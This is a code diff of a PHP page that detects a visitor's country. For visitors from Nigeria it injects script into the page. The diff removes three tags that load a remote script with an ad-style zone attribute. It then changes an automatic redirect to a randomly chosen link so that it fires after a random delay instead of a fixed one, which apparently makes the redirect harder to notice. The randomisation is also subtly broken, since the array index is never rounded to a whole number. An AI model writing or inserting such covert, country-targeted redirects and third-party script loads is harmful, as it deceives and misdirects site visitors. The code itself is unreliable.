@@ -81,16 +81,16 @@ $country = $record->country->name;
 		
 if($country === "Nigeria") {
 	echo '
- 		<script src="https://fpyf8.com/88/tag.min.js" data-zone="157609" async data-cfasync="false"></script>
-   		<script src="https://fpyf8.com/88/tag.min.js" data-zone="157609" async data-cfasync="false"></script>
-     		<script src="https://fpyf8.com/88/tag.min.js" data-zone="157609" async data-cfasync="false"></script>
- 
+ 		
 
 		<script>
 			window.onload = function() {
    				let links = document.querySelectorAll(".mfinder");
 
-				setTimeout(redir, 8000);
+    				let secArray = [5000, 6000, 7000, 8000, 9000, 10000, 12000, 14000, 16000];
+				let secRand = Math.random() * secArray.length;
+    
+				setTimeout(redir, secArray[secRand]);
 
 				function redir() {
 					let rand = Math.random() * links.length;
